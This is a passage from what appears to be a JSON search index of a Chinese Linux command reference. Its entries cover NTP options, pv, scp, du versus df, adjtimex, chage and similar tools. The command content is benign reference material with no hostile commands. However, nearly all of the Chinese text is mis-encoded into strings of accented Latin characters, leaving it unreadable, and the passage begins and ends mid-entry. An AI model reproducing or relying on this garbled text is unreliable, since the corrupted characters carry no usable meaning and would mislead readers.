ä¸æä¾›trapè¿œç¨‹ç™»å½•åŠŸèƒ½ï¼ŒtrapæœåŠ¡æ˜¯ä¸€ç§è¿œç¨‹æ—¶é—´æ—¥å¿—æœåŠ¡ã€‚ â—† notrust ä¸ä½œä¸ºåŒæ­¥çš„æ—¶é’Ÿæºã€‚ â—† nopeer æä¾›æ—¶é—´æœåŠ¡ï¼Œä½†ä¸ä½œä¸ºå¯¹ç­‰ä½“ã€‚ â—† kod å‘ä¸å®‰å…¨çš„è®¿é—®è€…å‘é€Kiss-Of-DeathæŠ¥æ–‡ã€‚ serveré€‰é¡¹ serveré€‰é¡¹æ ¼å¼: server host [ key n ] [ version n ] [ prefer ] [ mode n ] [ minpoll n ] [ maxpoll n ] [ iburst ] å…¶ä¸­hostæ˜¯ä¸Šå±‚NTPæœåŠ¡å™¨çš„IPåœ°å€æˆ–åŸŸåï¼Œéšåæ‰€è·Ÿçš„å‚æ•°è§£é‡Šå¦‚ä¸‹æ‰€ç¤ºï¼š â—† key è¡¨ç¤ºæ‰€æœ‰å‘å¾€æœåŠ¡å™¨çš„æŠ¥æ–‡åŒ…å«æœ‰ç§˜é’¥åŠ å¯†çš„è®¤è¯ä¿¡æ¯ï¼Œnæ˜¯32ä½çš„æ•´æ•°ï¼Œè¡¨ç¤ºç§˜é’¥å·ã€‚ â—† version è¡¨ç¤ºå‘å¾€ä¸Šå±‚æœåŠ¡å™¨çš„æŠ¥æ–‡ä½¿ç”¨çš„ç‰ˆæœ¬å·ï¼Œné»˜è®¤æ˜¯3ï¼Œå¯ä»¥æ˜¯1æˆ–è€…2ã€‚ â—† prefer å¦‚æœæœ‰å¤šä¸ªserveré€‰é¡¹ï¼Œå…·æœ‰è¯¥å‚æ•°çš„æœåŠ¡å™¨æœ‰é™ä½¿ç”¨ã€‚ â—† mode æŒ‡å®šæ•°æ®æŠ¥æ–‡modeå­—æ®µçš„å€¼ã€‚ â—† minpoll æŒ‡å®šä¸æŸ¥è¯¢è¯¥æœåŠ¡å™¨çš„æœ€å°æ—¶é—´é—´éš”ä¸º2çš„næ¬¡æ–¹ç§’ï¼Œné»˜è®¤ä¸º6ï¼ŒèŒƒå›´ä¸º4-14ã€‚ â—† maxpoll æŒ‡å®šä¸æŸ¥è¯¢è¯¥æœåŠ¡å™¨çš„æœ€å¤§æ—¶é—´é—´éš”ä¸º2çš„næ¬¡æ–¹ç§’ï¼Œné»˜è®¤ä¸º10ï¼ŒèŒƒå›´ä¸º4-14ã€‚ â—† iburst å½“åˆå§‹åŒæ­¥è¯·æ±‚æ—¶ï¼Œé‡‡ç”¨çªå‘æ–¹å¼æ¥è¿å‘é€8ä¸ªæŠ¥æ–‡ï¼Œæ—¶é—´é—´éš”ä¸º2ç§’ã€‚ å‚è€ƒ: ntpæœåŠ¡å™¨restrictå’Œserveré€‰é¡¹æ ¼å¼","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-NTPQ.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-NTPQ.html"},{"title":"parted","text":"åˆ—å‡ºç£ç›˜çš„åˆ†åŒºè¡¨ç±»å‹ä¸åˆ†åŒºä¿¡æ¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PARTED.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PARTED.html"},{"title":"pv","text":"Pipe Viewer æ˜¾ç¤ºå½“å‰åœ¨å‘½ä»¤è¡Œæ‰§è¡Œçš„å‘½ä»¤çš„è¿›åº¦ä¿¡æ¯ï¼Œç®¡é“æŸ¥çœ‹å™¨ -p , --progress æ˜¾ç¤ºè¿›åº¦æ¡ -t , --timer æ˜¾ç¤ºå·²ç”¨æ—¶é—´ -e , --eta æ˜¾ç¤ºé¢„è®¡åˆ°è¾¾æ—¶é—´ (å®Œæˆ) -I , --fineta æ˜¾ç¤ºç»å¯¹ä¼°è®¡åˆ°è¾¾æ—¶é—´ (å®Œæˆ) -r , --rate æ˜¾ç¤ºæ•°æ®ä¼ è¾“é€Ÿç‡è®¡æ•°å™¨ -a , --average-rate æ˜¾ç¤ºæ•°æ®ä¼ è¾“å¹³å‡é€Ÿç‡è®¡æ•°å™¨ -b , --bytes æ˜¾ç¤ºä¼ è¾“çš„å­—èŠ‚æ•° -T , --buffer-percent æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„ä¼ è¾“ç¼“å†²åŒºç™¾åˆ†æ¯” -A , --last-written NUM æ˜¾ç¤ºä¸Šæ¬¡å†™å…¥çš„å­—èŠ‚æ•° -F , --format FORMAT å°†è¾“å‡ºæ ¼å¼è®¾ç½®ä¸ºFORMAT -n , --numeric è¾“å‡ºç™¾åˆ†æ¯” -q , --quiet ä¸è¾“å‡ºä»»ä½•ä¿¡æ¯(ä¸æ˜¾ç¤ºè¿›åº¦æ¡) -W , --wait åœ¨ä¼ è¾“ç¬¬ä¸€ä¸ªå­—èŠ‚ä¹‹å‰ä¸æ˜¾ç¤ºä»»ä½•å†…å®¹ -D , --delay-start SEC åœ¨SECç§’è¿‡å»ä¹‹å‰ä¸æ˜¾ç¤ºä»»ä½•å†…å®¹ -s , --size SIZE å°†ä¼°ç®—çš„æ•°æ®å¤§å°è®¾ç½®ä¸ºSIZEå­—èŠ‚ -l , --line-mode è®¡ç®—è¡Œæ•°è€Œä¸æ˜¯å­—èŠ‚æ•° -0 , --null è¡Œä»¥é›¶ç»“å°¾ -i , --interval SEC æ¯SECç§’æ›´æ–°ä¸€æ¬¡ -w , --width WIDTH å‡è®¾ç»ˆç«¯çš„å®½åº¦ä¸ºWIDTHä¸ªå­—ç¬¦ -H , --height HEIGHT å‡è®¾ç»ˆç«¯é«˜åº¦ä¸ºHEIGHTè¡Œ -N , --name NAME åœ¨å¯è§†ä¿¡æ¯å‰é¢åŠ ä¸Šåç§° -f , --force å°†æ ‡å‡†é”™è¯¯è¾“å‡ºåˆ°ç»ˆç«¯ -c , --cursor ä½¿ç”¨å…‰æ ‡å®šä½è½¬ä¹‰åºåˆ— -L , --rate-limit RATE å°†ä¼ è¾“é™åˆ¶ä¸ºæ¯ç§’RATEå­—èŠ‚, -L<num>æ¯ç§’æ‰“å°çš„å­—èŠ‚æ•° -B , --buffer-size BYTES ä½¿ç”¨BYTESçš„ç¼“å†²åŒºå¤§å° -C , --no-splice ä»ä¸ä½¿ç”¨splice()ï¼Œå§‹ç»ˆä½¿ç”¨è¯»/å†™ -E , --skip-errors è·³è¿‡è¾“å…¥ä¸­çš„è¯»å–é”™è¯¯ -S , --stop-at-size ä¼ è¾“--sizeå­—èŠ‚ååœæ­¢ -R , --remote PID æ›´æ–°è¿‡ç¨‹PIDçš„è®¾ç½® -P , --pidfile FILE å°†è¿›ç¨‹IDä¿å­˜åœ¨FILEä¸­ -d, --watchfd PID[:FD] ç›‘è§†è¿›ç¨‹PID,æ‰“å¼€çš„æ–‡ä»¶FD -h, --help æ˜¾ç¤ºå¸®åŠ© -V, --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ ç¤ºä¾‹ åŒ€é€Ÿæ‰“å°: echo \"xxxxxxx\" | pv -qL 10 æ­¤ç¤ºä¾‹å‚è€ƒ: linuxæœ‰è¶£çš„å‘½ä»¤","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PV.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-PV.html"},{"title":"readlink","text":"Linux ç³»ç»Ÿä¸­ä¸€ä¸ªå¸¸ç”¨å·¥å…·ï¼Œä¸»è¦ç”¨æ¥æ‰¾å‡ºç¬¦å·é“¾æ¥æ‰€æŒ‡å‘çš„ä½ç½® -f é€’å½’è·Ÿéšç»™å‡ºæ–‡ä»¶åçš„æ‰€æœ‰ç¬¦å·é“¾æ¥ä»¥æ ‡å‡†åŒ–ï¼Œé™¤æœ€åä¸€ä¸ªå¤–æ‰€æœ‰ç»„ä»¶å¿…é¡»å­˜åœ¨ã€‚ ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ä¸€ç›´è·Ÿéšç¬¦å·é“¾æ¥ï¼Œç›´åˆ°éç¬¦å·é“¾æ¥çš„æ–‡ä»¶ä½ç½®ï¼Œ é™åˆ¶æ˜¯æœ€åå¿…é¡»å­˜åœ¨ä¸€ä¸ªéç¬¦å·é“¾æ¥çš„æ–‡ä»¶ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Readlink.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Readlink.html"},{"title":"scp","text":"åŠ å¯† çš„æ–¹å¼åœ¨æœ¬åœ°ä¸»æœºå’Œè¿œç¨‹ä¸»æœºä¹‹é—´å¤åˆ¶æ–‡ä»¶ï¼ˆåŸºäºsshï¼‰ ç”¨äºåœ¨Linuxä¸‹è¿›è¡Œè¿œç¨‹æ‹·è´æ–‡ä»¶çš„å‘½ä»¤ï¼Œå’Œå®ƒç±»ä¼¼çš„å‘½ä»¤æœ‰ cpï¼Œ ä¸è¿‡cpåªæ˜¯åœ¨æœ¬æœºè¿›è¡Œæ‹·è´ä¸èƒ½è·¨æœåŠ¡å™¨ï¼Œè€Œä¸”scpä¼ è¾“æ˜¯åŠ å¯†çš„ã€‚ å¯èƒ½ä¼šç¨å¾®å½±å“ä¸€ä¸‹é€Ÿåº¦ã€‚ å½“ä½ æœåŠ¡å™¨ç¡¬ç›˜å˜ä¸ºåªè¯»read only systemæ—¶ï¼Œç”¨scpå¯ä»¥å¸®ä½ æŠŠæ–‡ä»¶ç§»å‡ºæ¥ã€‚ å¦å¤–ï¼Œscpè¿˜éå¸¸ä¸å èµ„æºï¼Œä¸ä¼šæé«˜å¤šå°‘ç³»ç»Ÿè´Ÿè·ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œrsyncå°±è¿œè¿œä¸åŠå®ƒäº†ã€‚ è™½ç„¶ rsyncæ¯”scpä¼šå¿«ä¸€ç‚¹ï¼Œä½†å½“å°æ–‡ä»¶ä¼—å¤šçš„æƒ…å†µä¸‹ï¼Œ rsyncä¼šå¯¼è‡´ç¡¬ç›˜I/Oéå¸¸é«˜ï¼Œè€ŒscpåŸºæœ¬ä¸å½±å“ç³»ç»Ÿæ­£å¸¸ä½¿ç”¨ã€‚ è¯­æ³• : scp(é€‰é¡¹)(å‚æ•°) é€‰é¡¹ -1 å¼ºåˆ¶scpå‘½ä»¤ä½¿ç”¨åè®®ssh1 -2 å¼ºåˆ¶scpå‘½ä»¤ä½¿ç”¨åè®®ssh2 -4 å¼ºåˆ¶scpå‘½ä»¤åªä½¿ç”¨IPv4å¯»å€ -6 å¼ºåˆ¶scpå‘½ä»¤åªä½¿ç”¨IPv6å¯»å€ -B ä½¿ç”¨æ‰¹å¤„ç†æ¨¡å¼ï¼ˆä¼ è¾“è¿‡ç¨‹ä¸­ä¸è¯¢é—®ä¼ è¾“å£ä»¤æˆ–çŸ­è¯­ï¼‰ -C å…è®¸å‹ç¼©ã€‚ï¼ˆå°†-Cæ ‡å¿—ä¼ é€’ç»™sshï¼Œä»è€Œæ‰“å¼€å‹ç¼©åŠŸèƒ½ï¼‰ -p ä¿ç•™åŸæ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ï¼Œè®¿é—®æ—¶é—´å’Œè®¿é—®æƒé™ã€‚ -q ä¸æ˜¾ç¤ºä¼ è¾“è¿›åº¦æ¡ã€‚ -r é€’å½’å¤åˆ¶æ•´ä¸ªç›®å½•ã€‚ -v è¯¦ç»†æ–¹å¼æ˜¾ç¤ºè¾“å‡ºã€‚scpå’Œssh(1)ä¼šæ˜¾ç¤ºå‡ºæ•´ä¸ªè¿‡ç¨‹çš„è°ƒè¯•ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯ç”¨äºè°ƒè¯•è¿æ¥ï¼ŒéªŒè¯å’Œé…ç½®é—®é¢˜ã€‚ -c cipher ä»¥cipherå°†æ•°æ®ä¼ è¾“è¿›è¡ŒåŠ å¯†ï¼Œè¿™ä¸ªé€‰é¡¹å°†ç›´æ¥ä¼ é€’ç»™sshã€‚ -F ssh_config æŒ‡å®šä¸€ä¸ªæ›¿ä»£çš„sshé…ç½®æ–‡ä»¶ï¼Œæ­¤å‚æ•°ç›´æ¥ä¼ é€’ç»™sshã€‚ -i identity_file ä»æŒ‡å®šæ–‡ä»¶ä¸­è¯»å–ä¼ è¾“æ—¶ä½¿ç”¨çš„å¯†é’¥æ–‡ä»¶ï¼Œæ­¤å‚æ•°ç›´æ¥ä¼ é€’ç»™sshã€‚ -l limit é™å®šç”¨æˆ·æ‰€èƒ½ä½¿ç”¨çš„å¸¦å®½ï¼Œä»¥Kbit/sä¸ºå•ä½ã€‚ -o ssh_option å¦‚æœä¹ æƒ¯äºä½¿ç”¨ssh_config(5)ä¸­çš„å‚æ•°ä¼ é€’æ–¹å¼ï¼Œ -P port æ³¨æ„æ˜¯å¤§å†™çš„P, portæ˜¯æŒ‡å®šæ•°æ®ä¼ è¾“ç”¨åˆ°çš„ç«¯å£å· -S program æŒ‡å®šåŠ å¯†ä¼ è¾“æ—¶æ‰€ä½¿ç”¨çš„ç¨‹åºã€‚æ­¤ç¨‹åºå¿…é¡»èƒ½å¤Ÿç†è§£ssh(1)çš„é€‰é¡¹ã€‚ å‚æ•° æºæ–‡ä»¶ï¼šæŒ‡å®šè¦å¤åˆ¶çš„æºæ–‡ä»¶ã€‚ ç›®æ ‡æ–‡ä»¶ï¼šç›®æ ‡æ–‡ä»¶ã€‚æ ¼å¼ä¸º`user@hostï¼šfilename`ï¼ˆæ–‡ä»¶åä¸ºç›®æ ‡æ–‡ä»¶çš„åç§°ï¼‰ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SCP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SCP.html"},{"title":"seq","text":"ä»¥æŒ‡å®šå¢é‡ä»é¦–æ•°å¼€å§‹æ‰“å°æ•°å­—åˆ°å°¾æ•° -f, --format=æ ¼å¼ ä½¿ç”¨printf æ ·å¼çš„æµ®ç‚¹æ ¼å¼ -s, --separator=å­—ç¬¦ä¸² ä½¿ç”¨æŒ‡å®šå­—ç¬¦ä¸²åˆ†éš”æ•°å­—ï¼ˆé»˜è®¤ä½¿ç”¨ï¼šnï¼‰ -w, --equal-width åœ¨åˆ—å‰æ·»åŠ 0 ä½¿å¾—å®½åº¦ç›¸åŒ #%åé¢æŒ‡å®šæ•°å­—çš„ä½æ•° é»˜è®¤æ˜¯%gï¼Œ%3gé‚£ä¹ˆæ•°å­—ä½æ•°ä¸è¶³éƒ¨åˆ†æ˜¯ç©ºæ ¼: #seq -f\"%3g\" 9 11 9 10 11","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SEQ.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SEQ.html"},{"title":"ssh","text":"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SSH.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SSH.html"},{"title":"du","text":"duï¼Œdisk usage, æ˜¯é€šè¿‡æœç´¢æ–‡ä»¶æ¥è®¡ç®—æ¯ä¸ªæ–‡ä»¶çš„å¤§å°ç„¶åç´¯åŠ ï¼Œ duèƒ½çœ‹åˆ°çš„æ–‡ä»¶åªæ˜¯ä¸€äº›å½“å‰å­˜åœ¨çš„ï¼Œæ²¡æœ‰è¢«åˆ é™¤çš„ã€‚ ä»–è®¡ç®—çš„å¤§å°å°±æ˜¯å½“å‰ä»–è®¤ä¸ºå­˜åœ¨çš„æ‰€æœ‰æ–‡ä»¶å¤§å°çš„ç´¯åŠ å’Œ -s æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿä¸­æ‰€æœ‰çš„ç›®å½•ã€ç¬¦å·é“¾æ¥å’Œæ–‡ä»¶ä½¿ç”¨çš„å—æ•°ç´¯åŠ å¾—åˆ°è¯¥æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨çš„æ€»å—æ•° ç›¸å…³æŒ‡ä»¤: df ä¸dfåŒºåˆ« å¦‚: [root@www ~]# du -sh /home 4.7G /home [root@www ~]# df -h /home Filesystem Size Used Avail Use% Mounted on /dev/sda5 15G 4.9G 8.9G 36% /home [root@www ~]# df å‘½ä»¤ é€šè¿‡æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç£ç›˜å—åˆ†é…å›¾å¾—å‡ºæ€»å—æ•°ä¸å‰©ä½™å—æ•°ã€‚ æ–‡ä»¶ç³»ç»Ÿåˆ†é…å…¶ä¸­çš„ä¸€äº›ç£ç›˜å—ç”¨æ¥è®°å½•å®ƒè‡ªèº«çš„ä¸€äº›æ•°æ®ï¼Œå¦‚ièŠ‚ç‚¹ï¼Œç£ç›˜åˆ†å¸ƒå›¾ï¼Œé—´æ¥å—ï¼Œè¶…çº§å—ç­‰ã€‚ è¿™äº›æ•°æ®å¯¹å¤§å¤šæ•°ç”¨æˆ·çº§çš„ç¨‹åºæ¥è¯´æ˜¯ä¸å¯è§çš„ï¼Œé€šå¸¸ç§°ä¸ºMeta Dataã€‚ du å‘½ä»¤ æ˜¯ç”¨æˆ·çº§çš„ç¨‹åºï¼Œå®ƒä¸è€ƒè™‘Meta Dataï¼Œ è€Œdfå‘½ä»¤åˆ™æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜åˆ†é…å›¾å¹¶è€ƒè™‘Meta Dataã€‚ dfå‘½ä»¤è·å¾—çœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿæ•°æ®ï¼Œè€Œduå‘½ä»¤åªæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿçš„éƒ¨åˆ†æƒ…å†µã€‚ ä¸lsåŒºåˆ« æ–‡ä»¶å¤§å°çš„ä¸¤ä¸ªæ¦‚å¿µ æ–‡ä»¶å ç”¨ç£ç›˜ç©ºé—´çš„å¤§å° æ–‡ä»¶å®é™…çš„å¤§å° du -kå±äºç¬¬ä¸€ç§ï¼Œè®¡ç®—çš„æ˜¯æ–‡ä»¶å ç”¨ç£ç›˜ç©ºé—´çš„å¤§å°ã€‚ åœ¨ç”µè„‘çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå­˜å‚¨æ˜¯ä»¥å—(Block)ä¸ºå•ä½çš„ï¼Œä¸åŒçš„ç³»ç»Ÿå—çš„å¤§å°ä¸ä¸€æ ·ï¼Œ æ¯”å¦‚è¯´ macOS ä¸€ä¸ªå—çš„å¤§å°æ˜¯ 4096 å­—èŠ‚ã€‚å‡è®¾ä¸€ä¸ªæ–‡ä»¶æœ‰ 4097 å­—èŠ‚ï¼Œ4097-4096=1ï¼Œ è¿™ä¸ªæ–‡ä»¶åœ¨å ç”¨äº†ä¸€ä¸ªå—ä¹‹åï¼Œè¿˜æœ‰ä¸€ä¸ªå­—èŠ‚ä¼šå ç”¨åˆ°ä¸€ä¸ªå—ï¼Œ è€Œå—ä¸å—ä¹‹é—´æ˜¯ä¸å…±äº«ç©ºé—´çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‰©ä¸‹çš„ 1 å­—èŠ‚å ç”¨äº†ä¸€ä¸ªå—ï¼Œ è¿™ä¸ªå—è¿˜ç©ºå‡º 4095 å­—èŠ‚ï¼Œä½†æ˜¯æ— æ³•ç”¨äºå­˜å‚¨å…¶ä»–æ–‡ä»¶ã€‚ æ‰€ä»¥ï¼Œè¿™ä¸ªå¤§å°ä¸º 4097 å­—èŠ‚çš„æ–‡ä»¶å ç”¨äº† 2 ä¸ªå—ã€‚ è€Œ du -k è®¡ç®—çš„æ­£æ˜¯æ¯ä¸ªæ–‡ä»¶å ç”¨å—çš„å¤šå°‘ã€‚ åŒç†å¯å¾—ï¼Œå…¶ä¸­å¿…å®šæœ‰éƒ¨åˆ†å—æ˜¯æ²¡æœ‰å æ»¡çš„ï¼Œæ‰€ä»¥å’Œå®é™…çš„æ–‡ä»¶å¤§å°æœ‰å·®å¼‚ã€‚ ls -læŸ¥çœ‹æ–‡ä»¶å®é™…å¤§å°è€Œéå—å¤§å°","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Spend.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Spend.html"},{"title":"unalias","text":"å»é™¤ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/alias è®¾ç½®çš„åˆ«å","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Unalias.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Unalias.html"},{"title":"adjtimex","text":"linuxç³»ç»Ÿæœ‰ä¸¤ä¸ªæ—¶é’Ÿï¼š ä¸€ä¸ªæ˜¯ç”±ä¸»æ¿ç”µæ± é©±åŠ¨çš„\"Real Time Clock\"ä¹Ÿå«åšRTCæˆ–è€…å«CMOSæ—¶é’Ÿï¼Œç¡¬ä»¶æ—¶é’Ÿã€‚ å½“æ“ä½œç³»ç»Ÿå…³æœºçš„æ—¶å€™ï¼Œç”¨è¿™ä¸ªæ¥è®°å½•æ—¶é—´ï¼Œä½†æ˜¯å¯¹äºè¿è¡Œçš„ç³»ç»Ÿæ˜¯ä¸ç”¨è¿™ä¸ªæ—¶é—´çš„ã€‚ å¦ä¸€ä¸ªæ—¶é—´æ˜¯ \"System clock\"ä¹Ÿå«å†…æ ¸æ—¶é’Ÿæˆ–è€…è½¯ä»¶æ—¶é’Ÿï¼Œ æ˜¯ç”±è½¯ä»¶æ ¹æ®æ—¶é—´ä¸­æ–­æ¥è¿›è¡Œè®¡æ•°çš„ï¼Œå†…æ ¸æ—¶é’Ÿåœ¨ç³»ç»Ÿå…³æœºçš„æƒ…å†µä¸‹æ˜¯ä¸å­˜åœ¨çš„ï¼Œ æ‰€ä»¥ï¼Œå½“æ“ä½œç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™ï¼Œå†…æ ¸æ—¶é’Ÿæ˜¯è¦è¯»å–RTCæ—¶é—´æ¥è¿›è¡Œæ—¶é—´åŒæ­¥ ï¼ˆæœ‰äº›æƒ…å†µä¸‹ï¼Œå†…æ ¸æ—¶é’Ÿä¹Ÿå¯ä»¥é€šè¿‡ntpæœåŠ¡å™¨æ¥è¯»å–æ—¶é—´ï¼‰ è¿™ä¸¤ä¸ªæ—¶é’Ÿé€šå¸¸ä¼šæœ‰ä¸€äº›è¯¯å·®ï¼Œ æ‰€ä»¥é•¿æ—¶é—´å¯ä»¥å¯¼è‡´è¿™ä¸¤ä¸ªæ—¶é’Ÿåç¦»çš„æ¯”è¾ƒå¤šï¼Œ æœ€ç®€å•çš„ä¿æŒä¸¤ä¸ªæ—¶é—´åŒæ­¥çš„æ–¹æ³•æ˜¯ç”¨è½¯ä»¶æµ‹å‡ºä»–ä»¬ä¹‹é—´çš„è¯¯å·®ç‡ï¼Œç„¶åç”¨è½¯ä»¶è¿›è¡Œä¿®æ­£ã€‚ adjtimexé€‰é¡¹ -p, â€“print è¾“å‡ºå†…æ ¸æ—¶é—´å˜é‡çš„å€¼ -t, â€“tick val è®¾ç½®å†…æ ¸æ—¶é’Ÿè®¡æ•°é—´éš”ï¼ˆå¾®ç§’ï¼‰ -f, â€“frequency newfreq è®¾ç½®ç³»ç»Ÿæ—¶é’Ÿåç§»é‡ -c, â€“compare[=count] æ¯”è¾ƒç³»ç»Ÿæ—¶é’Ÿå’ŒCMOSæ—¶é’Ÿ -i, â€“interval tim è®¾ç½®æ—¶é’Ÿæ¯”è¾ƒé—´éš”æ—¶é—´ (sec) -l, â€“log[=file] å°†å½“å‰æ—¶é—´è®°å½•åˆ°æ–‡ä»¶ä¸­ â€“host timeserver æŸ¥è¯¢æ—¶é—´æœåŠ¡å™¨ -u, â€“utc å°†CMOSæ—¶é’Ÿè®¾ç½®æˆUTC æ¯æ¬¡é‡å¯NTPæœåŠ¡å™¨ä¹‹åå¤§çº¦è¦3ï¼5åˆ†é’Ÿå®¢æˆ·ç«¯æ‰èƒ½ä¸serverå»ºç«‹æ­£å¸¸çš„é€šè®¯è¿æ¥","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-adjtimex.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-adjtimex.html"},{"title":"alias","text":"å‘½ä»¤åˆ«å å¦‚: alias lm='ls -al | more' ä½¿ç”¨ unalias å»é™¤","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-alias.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-alias.html"},{"title":"ss","text":"æŸ¥çœ‹æœ¬åœ°è¿æ¥ sså‘½ä»¤å¯ä»¥ä¼ é€’çš„å‚æ•°ï¼š -t æ˜¾ç¤ºTCPç«¯å£ -u æ˜¾ç¤ºUDPç«¯å£ -n ä¸è§£æä¸»æœºå -l æ˜¾ç¤ºç›‘å¬ç«¯å£ -p æ˜¾ç¤ºè¿›ç¨‹ -4 ä»…æ˜¾ç¤ºIPv4çš„socketè¿æ¥","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-at-any-time.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-at-any-time.html"},{"title":"basename","text":"æ‰“å°ç›®å½•æˆ–è€…æ–‡ä»¶çš„åŸºæœ¬åç§°ã€‚ basenameå’Œ dirname å‘½ä»¤é€šå¸¸ç”¨äºshellè„šæœ¬ä¸­çš„å‘½ä»¤æ›¿æ¢æ¥æŒ‡å®šå’ŒæŒ‡å®šçš„è¾“å…¥æ–‡ä»¶åç§°æœ‰æ‰€å·®å¼‚çš„è¾“å‡ºæ–‡ä»¶åç§°ã€‚ è¦æ˜¾ç¤ºä¸€ä¸ªshellå˜é‡çš„åŸºæœ¬åç§°ï¼Œè¯·è¾“å…¥: basename $WORKFILE","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-basename.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-basename.html"},{"title":"blkid","text":"åˆ—å‡ºè£…ç½®çš„uuid","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-blkid.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-blkid.html"},{"title":"chage","text":"ç”¨æ¥ä¿®æ”¹å¸å·å’Œå¯†ç çš„æœ‰æ•ˆæœŸé™ã€‚ è¯­æ³• : chage [é€‰é¡¹] ç”¨æˆ·å é€‰é¡¹ -m å¯†ç å¯æ›´æ”¹çš„æœ€å°å¤©æ•°ã€‚ä¸ºé›¶æ—¶ä»£è¡¨ä»»ä½•æ—¶å€™éƒ½å¯ä»¥æ›´æ”¹å¯†ç ã€‚ -M å¯†ç ä¿æŒæœ‰æ•ˆçš„æœ€å¤§å¤©æ•°ã€‚ -w ç”¨æˆ·å¯†ç åˆ°æœŸå‰ï¼Œæå‰æ”¶åˆ°è­¦å‘Šä¿¡æ¯çš„å¤©æ•°ã€‚ -E å¸å·åˆ°æœŸçš„æ—¥æœŸã€‚è¿‡äº†è¿™å¤©ï¼Œæ­¤å¸å·å°†ä¸å¯ç”¨ã€‚ -d ä¸Šä¸€æ¬¡æ›´æ”¹çš„æ—¥æœŸã€‚ -i åœæ»æ—¶æœŸã€‚å¦‚æœä¸€ä¸ªå¯†ç å·²è¿‡æœŸè¿™äº›å¤©ï¼Œé‚£ä¹ˆæ­¤å¸å·å°†ä¸å¯ç”¨ã€‚ -l ä¾‹å‡ºå½“å‰çš„è®¾ç½®ã€‚ç”±éç‰¹æƒç”¨æˆ·æ¥ç¡®å®šä»–ä»¬çš„å¯†ç æˆ–å¸å·ä½•æ—¶è¿‡æœŸã€‚ æˆ‘çš„æœåŠ¡å™¨rootå¸æˆ·å¯†ç ç­–ç•¥ä¿¡æ¯å¦‚ä¸‹: [root@linuxde ~]# chage -l root æœ€è¿‘ä¸€æ¬¡å¯†ç ä¿®æ”¹æ—¶é—´ ï¼š 3æœˆ 12, 2013 å¯†ç è¿‡æœŸæ—¶é—´ ï¼šä»ä¸ å¯†ç å¤±æ•ˆæ—¶é—´ ï¼šä»ä¸ å¸æˆ·è¿‡æœŸæ—¶é—´ ï¼šä»ä¸ ä¸¤æ¬¡æ”¹å˜å¯†ç ä¹‹é—´ç›¸è·çš„æœ€å°å¤©æ•° ï¼š0 ä¸¤æ¬¡æ”¹å˜å¯†ç ä¹‹é—´ç›¸è·çš„æœ€å¤§å¤©æ•° ï¼š99999 åœ¨å¯†ç è¿‡æœŸä¹‹å‰è­¦å‘Šçš„å¤©æ•° ï¼š7 æˆ‘å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤ä¿®æ”¹æˆ‘çš„å¯†ç è¿‡æœŸæ—¶é—´: [root@linuxde ~]# chage -M 60 root [root@linuxde ~]# chage -l root æœ€è¿‘ä¸€æ¬¡å¯†ç ä¿®æ”¹æ—¶é—´ ï¼š 3æœˆ 12, 2013 å¯†ç è¿‡æœŸæ—¶é—´ ï¼š 5æœˆ 11, 2013 å¯†ç å¤±æ•ˆæ—¶é—´ ï¼šä»ä¸ å¸æˆ·è¿‡æœŸæ—¶é—´ ï¼šä»ä¸ ä¸¤æ¬¡æ”¹å˜å¯†ç 